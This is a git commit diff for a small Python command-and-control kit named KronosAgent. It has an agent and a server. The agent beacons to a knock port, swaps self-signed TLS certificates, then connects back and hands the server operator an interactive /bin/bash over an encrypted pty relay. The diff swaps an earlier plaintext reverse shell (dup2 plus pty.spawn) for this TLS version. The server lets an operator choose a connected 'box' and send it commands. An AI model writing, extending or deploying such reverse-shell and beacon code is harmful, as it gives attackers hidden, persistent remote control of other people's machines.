78cc03c31c204287cc6ddc268ee316bfbb900f4f
thatvoltguy <email@example.com>
2022-08-30 20:46:10 -0400

    stuffs

--- agent.py
+++ agent.py
@@ -1,9 +1,12 @@
-from os import dup2
+import subprocess
 import socket
 import pty
 import time
 import threading
-from subprocess import run
+from OpenSSL import crypto
+import ssl
+import os 
+import select 
 
 KNOCK_PORT = 31415
 HTTPS_PORT = 31416
@@ -17,34 +20,108 @@ class KronosAgent():
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.knock_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.host = host
+        self.tls_private_key_file = "my.key"
+        self.tls_cert_file = "my.crt"
+        self.tls_other_crt_file = "other.crt"
+        self.server_hostname='example.com'
+        self.crt = self.cert_gen()
+
+    def cert_gen(self, validityEndInSeconds=10*365*24*60*60):
+        k = crypto.PKey()
+        k.generate_key(crypto.TYPE_RSA, 2048)
+        cert = crypto.X509()
+        cert.gmtime_adj_notBefore(0)
+        cert.gmtime_adj_notAfter(validityEndInSeconds)
+        cert.set_issuer(cert.get_subject())
+        cert.set_pubkey(k)
+        cert.sign(k, 'sha512')
+        ret = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
+        with open(self.tls_cert_file, "wt") as f:
+            f.write(ret.decode("utf-8"))
+        with open(self.tls_private_key_file, "wt") as f:
+            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))
+        return ret
 
     def interact(self):
         with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
-            s.connect((self.host, HTTPS_PORT))
-            print("Connecting to "+ str((self.host, HTTPS_PORT)))
-            for x in range(0,3):
-                dup2(s.fileno(), x) 
-            pty.spawn("/bin/bash")
-            print("Shell spawned")
+            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=self.tls_other_crt_file)
+            context.verify_mode = ssl.CERT_REQUIRED
+            context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
+            ss = context.wrap_socket(self.sock, server_side=False, server_hostname=self.server_hostname)
+            ss.connect((self.host, HTTPS_PORT))
+            master, slave = pty.openpty()
+
+            bash = subprocess.Popen("/bin/bash",
+                                    preexec_fn=os.setsid,
+                                    stdin=slave,
+                                    stdout=slave,
+                                    stderr=slave,
+                                    universal_newlines=True)
+            
+            time.sleep(0.5)  
+            while bash.poll() is None:
+                r, w, e = select.select([ss, master], [], [])
+                if master in r:
+                    out = os.read(master, 2048)
+                    if out:
+                        out += b'-emrdeye'
+                        print("Data Sent: " + out.decode())
+                        ss.write(out)
+                elif ss in r:
+                    try:
+                        data = ss.recv(1024)
+                        print("Data Received: " + data.decode())
+                    except ssl.SSLError as e:
+                        if e.errno == ssl.SSL_ERROR_WANT_READ:
+                            continue
+                        raise
+                    if not data:  # End of file.
+                        break
+                    data_left = ss.pending()
+                    while data_left:
+                        data += ss.recv(data_left)
+                        data_left = ss.pending()
+                    os.write(master, data)
+                
+
 
     def health_check(self):
+        print("Trying to connect...")
         with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
-            s.connect((self.host, KNOCK_PORT))
-            s.sendall(b'Knock')
-            data = s.recv(1024)
-            print(data)
-            if data == b'Knock':
-                pass
-            elif data == b'HTTPS Start':
-                threading.Thread(target=self.interact(), args=()).start()
-                
-            else:
-                print("Agent Recieved unxpected data " + str(data))
-                exit()  
+            try:
+                s.connect((self.host, KNOCK_PORT))
+                print("Connected to :" + self.host)
+                s.sendall(b'Knock')
+                data = s.recv(1024)
+                if data == b'Knock':
+                    print("Data Received: " + data.decode())
+                    pass
+                elif b'crt-' in data:
+                    print("Data Received: " + data.decode())
+                    other_crt = data.split(b'crt-')[1]
+                    time.sleep(0.25) 
+                    crt = b'crt-'+self.crt
+                    print("Cert Sent")
+                    s.sendall(crt)
+                    resv = b''
+                    while resv == b'':
+                        try:
+                            s.settimeout(5)
+                            resv = s.recv(1024)
+                        except Exception as e:
+                            print("Didn't get go signal, retrying")
+                    with open(self.tls_other_crt_file, "wt") as f:
+                        f.write(other_crt.decode("utf-8"))
+                    threading.Thread(target=self.interact(), args=()).start()              
+                else:
+                    print("Server did not get cert, will retry")
+                    print("Agent Recieved unxpected data " + str(data))
+            except Exception as e:
+                print("Can't reach server will retry in 15 minutes")
 
 def main():
     k = KronosAgent(HOST)
     while True:
         k.health_check()
-        time.sleep((60*15))
+        time.sleep(15)
 main()
--- server.py
+++ server.py
@@ -1,5 +1,7 @@
 import socket
 import threading
+from OpenSSL import crypto
+import ssl
 import time
 
 KNOCK_PORT = 31415
@@ -8,16 +10,41 @@ HTTPS_PORT = 31416
 HOST = socket.gethostbyname(socket.gethostname())
 
 class ThreadedServer():
+
+
     def __init__(self, host):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.knock_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.knock_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.sock.bind((host, HTTPS_PORT))
+        self.host = host
         self.knock_sock.bind((host, KNOCK_PORT))
         self.ping_threads = {}
         self.ping_master = threading.Thread(target=self.listen, args=()).start()
+        self.tls_private_key_file = "s_my.key"
+        self.tls_cert_file = "s_my.crt"
+        self.tls_other_crt_file = "s_other.crt"
+        self.server_hostname = 'example.com'
+        self.my_crt = self.cert_gen()
         
+
+    def cert_gen(self, validityEndInSeconds=10*365*24*60*60):
+        k = crypto.PKey()
+        k.generate_key(crypto.TYPE_RSA, 2048)
+        cert = crypto.X509()
+        cert.get_subject().CN = "example.com"
+        cert.gmtime_adj_notBefore(0)
+        cert.gmtime_adj_notAfter(validityEndInSeconds)
+        cert.set_issuer(cert.get_subject())
+        cert.set_pubkey(k)
+        cert.sign(k, 'sha512')
+        ret = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
+        with open(self.tls_cert_file, "wt") as f:
+            f.write(ret.decode("utf-8"))
+        with open(self.tls_private_key_file, "wt") as f:
+            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))
+        return ret
+    
 
     def listen(self):
         self.knock_sock.listen(5)
@@ -38,45 +65,67 @@ class ThreadedServer():
                 con.send(b'Knock')
     
     def send_start(self, addy):
-        print(self.ping_threads)
-        print(addy)
-        con = self.ping_threads[addy]
-        print(con)
-        con.send(b'HTTPS Start')
+        crt = b''
+        while crt == b'':
+            try:
+                con = self.ping_threads[addy]
+                con.sendall(b'crt-'+self.my_crt)
+                print("Cert Sent")
+                con.settimeout(5)
+                print("Waiting...")
+                crt = con.recv(1024)
+                con.sendall(b'go')
+                print("Sent Start")
+                crt = crt.split(b'crt-')[1]
+                with open(self.tls_other_crt_file, "wt") as f:
+                    f.write(crt.decode("utf-8"))
+            except Exception as e:
+                print(e)
+                print("Didn't get TLS certs, retrying")
+                break
+        
         
 
     def handle_agent(self):
+        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH, cafile=self.tls_other_crt_file)
+        context.verify_mode = ssl.CERT_REQUIRED
+        context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
+        self.sock.bind((self.host, HTTPS_PORT))
         self.sock.listen(5)
-        con, _ = self.sock.accept()
-        con.settimeout(0.25)
-        print("HTTPS connct")
+        new_sock, addy = self.sock.accept()
+        con = context.wrap_socket(new_sock, server_side=True)
         buff = ""
-        temp = "______Sending Command______"
-        while temp:
+        while "-emrdeye" not in buff:
             try:
                 temp = con.recv(1024).decode()
                 buff +=  temp               
             except Exception as e:
-                temp = False
+                temp = ""
+        buff = buff.split("-emrdeye")[0]
         print(buff, end="")
         while True:
-            command = input()
+            command = input("")
             if command == "exit":
                 break
             command += "\n"
             con.send(command.encode())
-            temp = "______Sending Command______"
-            buff = ""
-            while temp:
-                try:
-                    temp = con.recv(1024).decode()
-                    buff += temp               
-                except Exception as e:
-                    temp = False
-                    pass
-            print(buff, end="")
-            
-
+            x = 3 if all(s not in command for s in ["cd", "exit()"]) else 2
+            count = 0
+            while count != x:
+                buff = ""
+                while "-emrdeye" not in buff:
+                    try:
+                        tmp = con.recv(1024).decode()
+                        buff += tmp           
+                    except Exception as e:
+                        print(e)
+                        pass
+                buff = buff.split("-emrdeye")[0]
+                if buff.strip():
+                    if count != 0:
+                        print(buff, end="")
+                    count += 1
+        con.close()
 
 def main():
     t = ThreadedServer(HOST)
@@ -94,10 +143,13 @@ def main():
                 print(str(c) + ". " + str(s))
                 c += 1
                 keys.append(s)
-            num = input("Number of box you want to connect to:")
-            addy = keys[int(num)]
-            t.send_start(addy)
-            t.handle_agent()
+            if len(t.ping_threads) > 0:
+                num = input("Number of box you want to connect to:")
+                addy = keys[int(num)]
+                t.send_start(addy)
+                t.handle_agent()
+            else:
+                print("No connected machines please wait")
 
 if __name__ == "__main__":
     main()
